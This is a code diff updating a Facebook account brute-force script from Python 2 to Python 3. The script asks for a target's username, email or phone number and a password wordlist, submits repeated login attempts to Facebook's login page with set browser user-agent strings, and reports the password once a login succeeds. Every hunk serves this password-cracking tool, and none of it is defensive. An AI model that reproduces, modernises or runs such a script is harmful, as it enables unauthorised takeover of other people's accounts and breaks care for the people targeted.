@@ -1,26 +1,28 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: UTF-8 -*-
-# This Cooding is Coode in python 2 now it willbe renew soon
+# Updated to Python 3
 
 import sys
 import mechanize
-import cookielib
+import http.cookiejar as cookielib
 import random
-#pip2 install mechanize
-#pip2 install requests
+# pip install mechanize
 
 
 
-email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+email = str(input("Enter the Facebook Username (or) Email (or) Phone Number : "))
 
 
-passwordlist = str(raw_input("Enter the wordlist name and path : "))
+passwordlist = str(input("Enter the wordlist name and path : "))
 
 
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 
 
-useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+useragents = [
+    'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
+    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1',
+]
 
 def main():
 	global br
@@ -50,7 +52,7 @@ def brute(password):
 	log = sub.geturl()
 	if log != login and (not 'login_attempt' in log):
 			print("\n\n[+] Password Find = {}".format(password))
-			raw_input("ANY KEY to Exit....")
+			input("ANY KEY to Exit....")
 			sys.exit(1)
 
 			
@@ -77,10 +79,10 @@ def welcome():
 """
 	total = open(passwordlist,"r")
 	total = total.readlines()
-	print wel 
-	print " [*] Account to crack : {}".format(email)
-	print " [*] Loaded :" , len(total), "passwords"
-	print " [*] Cracking, please wait ...\n\n"
+	print(wel)
+	print(" [*] Account to crack : {}".format(email))
+	print(" [*] Loaded :", len(total), "passwords")
+	print(" [*] Cracking, please wait ...\n\n")
 
 	
 if __name__ == '__main__':
